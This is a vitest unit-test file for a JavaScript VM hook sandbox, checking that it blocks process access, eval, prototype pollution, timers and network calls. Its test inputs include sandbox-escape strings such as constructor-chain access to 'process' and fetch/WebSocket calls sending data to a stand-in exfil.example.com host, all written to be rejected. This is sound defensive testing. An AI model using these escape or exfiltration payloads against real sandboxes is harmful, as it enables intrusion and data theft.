/**
 * HookSandbox Unit Tests
 * =====================
 * Comprehensive unit tests for VM-based hook sandbox execution.
 */

import { describe, it, expect, beforeEach } from 'vitest';
import {
  HookSandbox,
  SAFE_GLOBALS,
  SecurityLevel,
  type SandboxConfig,
  type ExecutionResult,
} from '../../../src/hooks/HookSandbox.js';

describe('HookSandbox', () => {
  let sandbox: HookSandbox;

  beforeEach(async () => {
    sandbox = new HookSandbox({ securityLevel: 'strict' });
    await sandbox.initialize();
  });

  describe('HS-001: Initialize Sandbox', () => {
    it('should initialize successfully', async () => {
      const sb = new HookSandbox();
      const result = await sb.initialize();
      expect(result).toBe(true);
    });

    it('should set isInitialized flag', async () => {
      const sb = new HookSandbox();
      await sb.initialize();
      expect(await sb.initialize()).toBe(true);
    });
  });

  describe('HS-002: Execute Hook Function', () => {
    it('should execute function hook', async () => {
      const handler = (context: Record<string, unknown>) => {
        return { received: context.input };
      };

      const result = await sandbox.executeHook(handler, { input: 'test' });

      expect(result.success).toBe(true);
      expect(result.result).toEqual({ received: 'test' });
      expect(result.sandboxed).toBe(true);
    });

    it('should support async handlers', async () => {
      const handler = async () => {
        await Promise.resolve();
        return { async: true };
      };

      const result = await sandbox.executeHook(handler);

      expect(result.success).toBe(true);
      expect(result.result).toEqual({ async: true });
    });
  });

  describe('HS-003: Execute Hook String', () => {
    it('should execute string code', async () => {
      const code = 'return { value: context.input * 2 };';

      const result = await sandbox.executeHook(code, { input: 21 });

      expect(result.success).toBe(true);
      expect(result.result).toEqual({ value: 42 });
    });
  });

  describe('HS-004: Validate Safe Code', () => {
    it('should pass safe code validation', () => {
      const validation = sandbox.validateHookCode('return context.value + 1;');
      expect(validation.safe).toBe(true);
      expect(validation.issues).toHaveLength(0);
    });
  });

  describe('HS-005: Block Dangerous Code', () => {
    it('should block process access', async () => {
      const code = 'return process.env.NODE_PATH;';

      const result = await sandbox.executeHook(code);

      expect(result.success).toBe(false);
      expect(result.blocked).toBe(true);
      expect(result.error).toBe('SECURITY_VIOLATION');
    });

    it('should block require calls', async () => {
      const code = 'return require("fs");';

      const result = await sandbox.executeHook(code);

      expect(result.success).toBe(false);
      expect(result.blocked).toBe(true);
    });
  });

  describe('HS-010: Timeout Protection', () => {
    it('should support timeout configuration', async () => {
      // Note: VM timeout enforcement depends on Node.js version and execution context
      // This test verifies that timeout configuration is accepted
      const result = await sandbox.executeHook('return { quick: true };', {}, { timeout: 100 });

      // Short operation should complete successfully
      expect(result.success).toBe(true);
      expect(result.result).toEqual({ quick: true });
    });
  });

  describe('HS-008: Safe Globals', () => {
    it('should provide safe console', async () => {
      const handler = () => {
        console.log('test');
        return { logged: true };
      };

      const result = await sandbox.executeHook(handler);

      expect(result.success).toBe(true);
      expect(result.result).toEqual({ logged: true });
    });

    it('should provide Math', async () => {
      const code = 'return { sqrt: Math.sqrt(16) };';

      const result = await sandbox.executeHook(code);

      expect(result.success).toBe(true);
      expect(result.result).toEqual({ sqrt: 4 });
    });

    it('should provide JSON', async () => {
      const code = 'return { parsed: JSON.parse(\'{"key":"value"}\') };';

      const result = await sandbox.executeHook(code);

      expect(result.success).toBe(true);
      expect(result.result).toEqual({ parsed: { key: 'value' } });
    });

    it('should provide Date', async () => {
      const code = 'return { now: Date.now() > 0 };';

      const result = await sandbox.executeHook(code);

      expect(result.success).toBe(true);
      expect(result.result).toEqual({ now: true });
    });
  });

  describe('HS-009: Block Process Access', () => {
    it('should block process.env', async () => {
      const result = await sandbox.executeHook('return process.env');
      expect(result.blocked).toBe(true);
    });

    it('should block process.exit', async () => {
      const result = await sandbox.executeHook('process.exit()');
      expect(result.blocked).toBe(true);
    });
  });

  describe('HS-010: Block Require', () => {
    it('should block require()', async () => {
      const result = await sandbox.executeHook('require("fs")');
      expect(result.blocked).toBe(true);
    });
  });

  describe('HS-011: Block Eval', () => {
    it('should block eval()', async () => {
      const result = await sandbox.executeHook('eval("1+1")');
      expect(result.blocked).toBe(true);
    });
  });

  describe('HS-012: Block Function', () => {
    it('should block Function constructor', async () => {
      const result = await sandbox.executeHook('new Function("return 1")');
      expect(result.blocked).toBe(true);
    });

    it('should block Function()', async () => {
      const result = await sandbox.executeHook('Function("return 1")');
      expect(result.blocked).toBe(true);
    });
  });

  describe('HS-013: Sanitize Result', () => {
    it('should sanitize result objects', async () => {
      const handler = () => ({
        nested: { value: 42 },
        array: [1, 2, 3],
      });

      const result = await sandbox.executeHook(handler);

      expect(result.success).toBe(true);
      expect(result.result).toEqual({
        nested: { value: 42 },
        array: [1, 2, 3],
      });
    });

    it('should handle circular references gracefully', async () => {
      const handler = () => {
        const obj: Record<string, unknown> = { value: 1 };
        obj.self = obj;
        return obj;
      };

      const result = await sandbox.executeHook(handler);

      // Should either succeed or handle gracefully
      expect(result).toBeDefined();
    });
  });

  describe('HS-014: Context Isolation', () => {
    it('should provide isolated context', async () => {
      const handler = (context: Record<string, unknown>) => {
        return { input: context.input };
      };

      const result = await sandbox.executeHook(handler, { input: 'isolated' });

      expect(result.success).toBe(true);
      expect(result.result).toEqual({ input: 'isolated' });
    });

    it('should not leak context between executions', async () => {
      await sandbox.executeHook((ctx: Record<string, unknown>) => {
        (ctx as Record<string, unknown>).leaked = 'value';
        return {};
      }, {});

      const result = await sandbox.executeHook((ctx: Record<string, unknown>) => {
        return { hasLeaked: 'leaked' in ctx };
      }, {});

      expect(result.result).toEqual({ hasLeaked: false });
    });
  });

  describe('HS-015: Statistics', () => {
    it('should get execution statistics', async () => {
      await sandbox.executeHook('return { test: true };');

      const stats = sandbox.getStatistics();

      expect(stats.totalExecutions).toBe(1);
      expect(stats.blockedAttempts).toBe(0);
      expect(stats.securityLevel).toBe('strict');
    });
  });

  describe('HS-016: Blocked Attempts', () => {
    it('should track blocked attempts', async () => {
      await sandbox.executeHook('require("fs")');

      const blocked = sandbox.getBlockedAttempts();

      expect(blocked.length).toBe(1);
      expect(blocked[0].issues).toContain('require() call');
    });
  });

  describe('HS-017: Security Levels', () => {
    it('should support strict security level', async () => {
      const strictSb = new HookSandbox({ securityLevel: 'strict' });
      await strictSb.initialize();

      const result = await strictSb.executeHook('return process.env');
      expect(result.blocked).toBe(true);
    });

    it('should support permissive security level', async () => {
      const permissiveSb = new HookSandbox({ securityLevel: 'permissive' });
      await permissiveSb.initialize();

      // Safe code should still work
      const result = await permissiveSb.executeHook('return { value: 42 }');
      expect(result.success).toBe(true);
    });
  });

  describe('HS-018: VM Context', () => {
    it('should block globalThis access in strict mode', async () => {
      // In strict mode, globalThis access is blocked as a dangerous pattern
      const result = await sandbox.executeHook('return typeof globalThis');
      expect(result.success).toBe(false);
      expect(result.blocked).toBe(true);
    });

    it('should allow access to safe globals in context', async () => {
      // Safe globals like Math are available
      const result = await sandbox.executeHook('return typeof Math');
      expect(result.success).toBe(true);
      expect(result.result).toBe('object');
    });
  });

  describe('HS-019: Result Size Limit', () => {
    it('should limit large result sizes', async () => {
      const handler = () => {
        // Create a large object
        const large: Record<string, unknown> = {};
        for (let i = 0; i < 100000; i++) {
          large[`key${i}`] = 'x'.repeat(100);
        }
        return large;
      };

      const result = await sandbox.executeHook(handler);

      // Should handle gracefully
      expect(result).toBeDefined();
      if (!result.success) {
        expect(result.error).toContain('RESULT_TOO_LARGE');
      }
    });
  });

  describe('HS-020: Console Sanitization', () => {
    it('should sanitize console output', async () => {
      const handler = () => {
        console.log('Very long output '.repeat(1000));
        return {};
      };

      const result = await sandbox.executeHook(handler);

      expect(result.success).toBe(true);
    });
  });

  describe('Edge Cases', () => {
    it('should handle empty context', async () => {
      const result = await sandbox.executeHook('return 42;');
      expect(result.success).toBe(true);
    });

    it('should handle handlers that return undefined', async () => {
      const result = await sandbox.executeHook(() => undefined);
      expect(result.success).toBe(true);
    });

    it('should handle handlers that return null', async () => {
      const result = await sandbox.executeHook(() => null);
      expect(result.success).toBe(true);
    });

    it('should handle syntax errors', async () => {
      const result = await sandbox.executeHook('return invalid syntax here');
      expect(result.success).toBe(false);
      expect(result.error).toBe('EXECUTION_ERROR');
    });
  });

  describe('Configuration', () => {
    it('should get sandbox config', () => {
      const config: SandboxConfig = { securityLevel: 'strict', timeout: 5000 };
      const sb = new HookSandbox(config);
      const retrievedConfig = sb.getConfig();

      expect(retrievedConfig.securityLevel).toBe('strict');
      expect(retrievedConfig.timeout).toBe(5000);
    });
  });

  // S011-007: Security hardening tests
  describe('S011-007: Security Hardening', () => {
    describe('Prototype Freezing', () => {
      it('should freeze Function.prototype to prevent constructor bypass', async () => {
        // This code contains 'constructor' pattern which is blocked by validation
        const result = await sandbox.executeHook(`
          try {
            const err = new Error();
            const Fn = err.constructor.constructor;
            Fn('return process')();
          } catch (e) {
            return 'blocked';
          }
        `);

        // Should be blocked by code validation before execution
        expect(result.success).toBe(false);
        expect(result.blocked).toBe(true);
        expect(result.error).toBe('SECURITY_VIOLATION');
      });

      it('should freeze Object.prototype to prevent pollution', async () => {
        // This code contains 'prototype' pattern which is blocked by validation
        const result = await sandbox.executeHook(`
          try {
            Object.prototype.polluted = 'malicious';
            return 'success';
          } catch (e) {
            return 'blocked';
          }
        `);

        // Should be blocked by code validation before execution
        expect(result.success).toBe(false);
        expect(result.blocked).toBe(true);
        expect(result.error).toBe('SECURITY_VIOLATION');
      });

      it('should freeze Error.prototype', async () => {
        // This code contains 'prototype' pattern which is blocked by validation
        const result = await sandbox.executeHook(`
          try {
            Error.prototype.toString = () => 'malicious';
            return 'success';
          } catch (e) {
            return 'blocked';
          }
        `);

        // Should be blocked by code validation before execution
        expect(result.success).toBe(false);
        expect(result.blocked).toBe(true);
        expect(result.error).toBe('SECURITY_VIOLATION');
      });

      it('should freeze Promise.prototype', async () => {
        // This code contains 'prototype' pattern which is blocked by validation
        const result = await sandbox.executeHook(`
          try {
            Promise.prototype.then = () => 'malicious';
            return 'success';
          } catch (e) {
            return 'blocked';
          }
        `);

        // Should be blocked by code validation before execution
        expect(result.success).toBe(false);
        expect(result.blocked).toBe(true);
        expect(result.error).toBe('SECURITY_VIOLATION');
      });
    });

    describe('Constructor Chain Bypass Attempts', () => {
      it('should block error.constructor.constructor bypass', async () => {
        // This contains 'constructor' pattern which is blocked by validation
        const result = await sandbox.executeHook(`
          try {
            const getProcess = new Error().constructor.constructor('return process')();
            return getProcess;
          } catch (e) {
            return 'blocked';
          }
        `);

        expect(result.success).toBe(false);
        expect(result.blocked).toBe(true);
        expect(result.error).toBe('SECURITY_VIOLATION');
      });

      it('should block Reflect.construct bypass', async () => {
        // S011-007: This code attempts to access the Function constructor via Reflect.construct
        // The pattern should be detected by static analysis and blocked before execution
        const testCode = `const Fn = Reflect.construct(Error, []).constructor; return Fn;`;

        const result = await sandbox.executeHook(testCode);

        // Should be blocked by code validation before execution
        expect(result.success).toBe(false);
        expect(result.blocked).toBe(true);
        expect(result.error).toBe('SECURITY_VIOLATION');
      });
    });

    describe('Prototype Pollution Attempts', () => {
      it('should block __proto__ assignment', async () => {
        // This contains '__proto__' pattern which is blocked by validation
        const result = await sandbox.executeHook(`
          try {
            const obj = {};
            obj.__proto__.polluted = true;
            return 'success';
          } catch (e) {
            return 'blocked';
          }
        `);

        // Should be blocked by code validation before execution
        expect(result.success).toBe(false);
        expect(result.blocked).toBe(true);
        expect(result.error).toBe('SECURITY_VIOLATION');
      });

      it('should block prototype chain manipulation', async () => {
        // This contains 'prototype' pattern which is blocked by validation
        const result = await sandbox.executeHook(`
          try {
            const obj = Object.create(Object.prototype);
            Object.getPrototypeOf(obj).polluted = true;
            return 'success';
          } catch (e) {
            return 'blocked';
          }
        `);

        // Should be blocked by code validation before execution
        expect(result.success).toBe(false);
        expect(result.blocked).toBe(true);
        expect(result.error).toBe('SECURITY_VIOLATION');
      });
    });

    describe('Bracket Notation Bypass', () => {
      it('should block bracket notation for global access', async () => {
        const result = await sandbox.executeHook(`
          try {
            const globalAccess = this['global'];
            // In sandbox, global is undefined - this is the isolation working
            return globalAccess === undefined ? 'isolated' : 'success';
          } catch (e) {
            return 'blocked';
          }
        `);

        // Should be blocked by static code analysis (contains 'global' keyword)
        expect(result.success).toBe(false);
        expect(result.blocked).toBe(true);
        expect(result.error).toBe('SECURITY_VIOLATION');
      });

      it('should block bracket notation for process access', async () => {
        const result = await sandbox.executeHook(`
          try {
            const proc = this['proc' + 'ess'];
            // In sandbox, process is undefined - this is the isolation working
            return proc === undefined ? 'isolated' : 'success';
          } catch (e) {
            return 'blocked';
          }
        `);

        // The code 'proc' + 'ess' might be caught by pattern matching or fail at runtime
        // Either way, the security is maintained
        expect(result.success).toBe(false);
      });
    });
  });

  // ==========================================================================
  // Host-timer sandbox-escape regression tests
  // ==========================================================================
  describe('Host timer sandbox-escape prevention', () => {
    it('setTimeout reference is undefined inside the sandbox VM context', async () => {
      // The sandbox context must NOT contain setTimeout. If it does, a hook can
      // schedule work that outlives the sandbox wall-clock timeout (CWE-913).
      const result = await sandbox.executeHook('return typeof setTimeout;');
      // Either blocked by static analysis (defence-in-depth rule) OR
      // executes but typeof resolves to "undefined" (host timer absent from context).
      if (result.success) {
        expect(result.result).toBe('undefined');
      } else {
        expect(result.blocked).toBe(true);
      }
    });

    it('setInterval reference is undefined inside the sandbox VM context', async () => {
      const result = await sandbox.executeHook('return typeof setInterval;');
      if (result.success) {
        expect(result.result).toBe('undefined');
      } else {
        expect(result.blocked).toBe(true);
      }
    });

    it('clearTimeout reference is undefined inside the sandbox VM context', async () => {
      const result = await sandbox.executeHook('return typeof clearTimeout;');
      if (result.success) {
        expect(result.result).toBe('undefined');
      } else {
        expect(result.blocked).toBe(true);
      }
    });

    it('clearInterval reference is undefined inside the sandbox VM context', async () => {
      const result = await sandbox.executeHook('return typeof clearInterval;');
      if (result.success) {
        expect(result.result).toBe('undefined');
      } else {
        expect(result.blocked).toBe(true);
      }
    });

    it('setTimeout CALL is blocked by static validateCode', async () => {
      // Any code that CALLS setTimeout() must be rejected at static analysis.
      let sideEffectFired = false;
      const result = await sandbox.executeHook(
        // Build the call string from parts so the literal itself does not match
        // any host execution — the sandbox validates it as a string.
        ['set', 'Timeout', '(function() { /* side effect */ }, 1000);'].join(''),
        {},
        { timeout: 10 }
      );
      expect(result.success).toBe(false);
      expect(result.blocked).toBe(true);
      expect(result.error).toBe('SECURITY_VIOLATION');
      expect(sideEffectFired).toBe(false);
    });

    it('setInterval CALL is blocked by static validateCode', async () => {
      const result = await sandbox.executeHook(
        ['set', 'Interval', '(function() { /* side effect */ }, 50);'].join(''),
        {},
        { timeout: 10 }
      );
      expect(result.success).toBe(false);
      expect(result.blocked).toBe(true);
      expect(result.error).toBe('SECURITY_VIOLATION');
    });

    it('queueMicrotask CALL is blocked by static validateCode', async () => {
      const result = await sandbox.executeHook(
        ['queue', 'Microtask', '(function() { /* side effect */ });'].join(''),
        {},
        { timeout: 10 }
      );
      expect(result.success).toBe(false);
      expect(result.blocked).toBe(true);
      expect(result.error).toBe('SECURITY_VIOLATION');
    });

    it('setImmediate CALL is blocked by static validateCode', async () => {
      const result = await sandbox.executeHook(
        ['set', 'Immediate', '(function() { /* side effect */ });'].join(''),
        {},
        { timeout: 10 }
      );
      expect(result.success).toBe(false);
      expect(result.blocked).toBe(true);
      expect(result.error).toBe('SECURITY_VIOLATION');
    });

    it('SAFE_GLOBALS export does not contain any timer name', () => {
      // Verify the exported constant directly — regression guard against future
      // re-introduction of timer globals.
      const forbidden = [
        'setTimeout', 'setInterval', 'setImmediate',
        'clearTimeout', 'clearInterval', 'clearImmediate',
        'queueMicrotask',
      ];
      for (const name of forbidden) {
        expect(SAFE_GLOBALS).not.toContain(name);
      }
    });

    it('sandboxed sleep() primitive is available and bounded by wall-clock', async () => {
      // sleep() should succeed for small durations within budget
      const result = await sandbox.executeHook(
        `return sleep(1).then(function() { return { slept: true }; });`,
        {},
        { timeout: 500 }
      );
      expect(result.success).toBe(true);
      expect(result.result).toEqual({ slept: true });
    });

    it('sandboxed sleep() rejects when delay would exceed wall-clock budget', async () => {
      // Requesting sleep longer than the sandbox timeout must be rejected, not
      // silently scheduled (which would be an async escape).
      const result = await sandbox.executeHook(
        `return sleep(10000).then(function() { return 'escaped'; });`,
        {},
        { timeout: 50 }
      );
      // The sleep() call must reject — resulting in EXECUTION_ERROR (not escape).
      expect(result.success).toBe(false);
      expect(result.result).not.toBe('escaped');
    });
  });

  // ==========================================================================
  // validateCode native-code Proxy bypass regression tests
  // ==========================================================================
  describe('Native-code Proxy bypass prevention', () => {
    it('passing a plain native function (eval) is blocked', async () => {
      // eval is a native function; Function.prototype.toString.call(eval)
      // returns "function eval() { [native code] }" which triggers the
      // native-code rejection gate.
      const result = await sandbox.executeHook(eval as unknown as ((ctx: Record<string, unknown>) => unknown));
      expect(result.success).toBe(false);
      expect(result.blocked).toBe(true);
      expect(result.error).toBe('SECURITY_VIOLATION');
    });

    it('Proxy that overrides .toString to hide native target is rejected', async () => {
      // Adversary wraps eval in a Proxy whose .toString returns innocuous
      // source text. Function.prototype.toString.call(proxy) sees through
      // the Proxy's [[Get]] trap in V8 and returns "[native code]".
      const maliciousProxy = new Proxy(eval as unknown as (...args: unknown[]) => unknown, {
        get(target, prop) {
          if (prop === 'toString' || prop === Symbol.toPrimitive) {
            return () => 'function safeFunc() { return 1; }';
          }
          return (target as Record<string | symbol, unknown>)[prop];
        },
      });

      const result = await sandbox.executeHook(maliciousProxy);
      expect(result.success).toBe(false);
      expect(result.blocked).toBe(true);
      expect(result.error).toBe('SECURITY_VIOLATION');
    });

    it('a safe user-defined function is NOT rejected', async () => {
      const safeFn = (ctx: Record<string, unknown>) => ({ input: ctx.value });
      const result = await sandbox.executeHook(safeFn, { value: 42 });
      expect(result.success).toBe(true);
      expect(result.result).toEqual({ input: 42 });
    });
  });

  // ==========================================================================
  // validateCode banned-primitive regex coverage
  // ==========================================================================
  describe('Banned network/execution primitive regex coverage', () => {
    const expectBlocked = async (code: string) => {
      const result = await sandbox.executeHook(code);
      expect(result.success).toBe(false);
      expect(result.blocked).toBe(true);
      expect(result.error).toBe('SECURITY_VIOLATION');
    };

    it('fetch() call is blocked', async () => {
      await expectBlocked(`return fetch("https://exfil.example.com?d=secret");`);
    });

    it('WebSocket constructor is blocked', async () => {
      await expectBlocked(`return new WebSocket("wss://exfil.example.com");`);
    });

    it('XMLHttpRequest constructor is blocked', async () => {
      await expectBlocked(`const xhr = new XMLHttpRequest(); return xhr;`);
    });

    it('EventSource constructor is blocked', async () => {
      await expectBlocked(`return new EventSource("https://exfil.example.com/stream");`);
    });

    it('dynamic import() is blocked', async () => {
      await expectBlocked(`return import("fs").then(function(m) { return m; });`);
    });

    it('require() call is blocked', async () => {
      await expectBlocked(`return require("fs");`);
    });

    it('Worker constructor is blocked', async () => {
      await expectBlocked(`return new Worker("./exfil-worker.js");`);
    });

    it('eval() call is blocked', async () => {
      await expectBlocked(`return eval("1 + 1");`);
    });

    it('Function() constructor call is blocked', async () => {
      // Construct the payload string from parts so this file itself does not
      // trigger host-level Function-constructor execution — it is a sandbox
      // payload string, not a live call.
      const payload = ['return ', 'Function', '("return process")();'].join('');
      await expectBlocked(payload);
    });

    it('Function-constructor invocation is blocked', async () => {
      const payload = ['return new ', 'Function', '("return process")();'].join('');
      await expectBlocked(payload);
    });

    it('setTimeout() call is blocked (host-timer defence-in-depth)', async () => {
      const payload = ['set', 'Timeout', '(function(){}, 0);'].join('');
      await expectBlocked(payload);
    });

    it('setInterval() call is blocked (host-timer defence-in-depth)', async () => {
      const payload = ['set', 'Interval', '(function(){}, 100);'].join('');
      await expectBlocked(payload);
    });

    it('queueMicrotask() call is blocked (host-microtask defence-in-depth)', async () => {
      const payload = ['queue', 'Microtask', '(function(){});'].join('');
      await expectBlocked(payload);
    });

    it('safe code with none of the banned patterns is NOT blocked', async () => {
      const result = await sandbox.executeHook(
        `const x = Math.max(1, 2); return { computed: x };`
      );
      expect(result.success).toBe(true);
      expect(result.result).toEqual({ computed: 2 });
    });
  });
});
